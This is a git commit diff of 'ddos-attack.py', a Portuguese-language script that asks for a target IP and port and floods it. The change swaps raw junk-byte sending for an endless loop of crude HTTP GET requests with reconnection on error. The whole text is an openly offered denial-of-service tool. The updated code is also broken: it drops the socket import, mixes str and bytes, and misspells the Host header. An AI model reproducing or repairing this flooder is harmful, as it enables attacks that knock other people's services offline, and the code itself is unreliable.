cc4e2717f5ad7329af611be260231d1b22f2a5a0
BLACKCØDER <69689969+BLCKCODERR@users.noreply.github.com>
2020-10-14 22:11:36 -0300

    update ddos-attack.py

--- ddos-attack.py
+++ ddos-attack.py
@@ -14,9 +14,6 @@ print("""
   youtube channel: ch33ch
 Powered by: koda/ch33ch/destruction/zero x ...\n\n""")
 
-
-import socket
-
 tcp_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
 ip = input("IP >>> ").strip()
@@ -27,8 +24,19 @@ except ValueError:
     print("Use somente número na porta!!")
     exit()
 
-morte = "###" * 1000
+try:
+    tcp_socket.connect((ip, port))
+    tcp_socket.settimeout(1)
+except Exception as error:
+    print(f"Erro ao se conectar: {error}")
 
 while True:
-        tcp_socket.sendto(morte.encode('ascii'), (ip, port))
+    try:
+    
+        tcp_socket.sendto("GET /" + ip + "HTTP/1.1\r\n".encode('ascii'), (ip, port))
+        tcp_socket.sendto("Hots: " + "182.30.33" + "\r\n\r\n".encode("ascii"), (ip, port))
         print(f"C4OS\033[31m({ip}//{port})\033[0m :<>> PACOTE ENVIADO")
+    
+    except:
+        tcp_socket.connect((ip, port))
+        tcp_socket.settimeout(2)
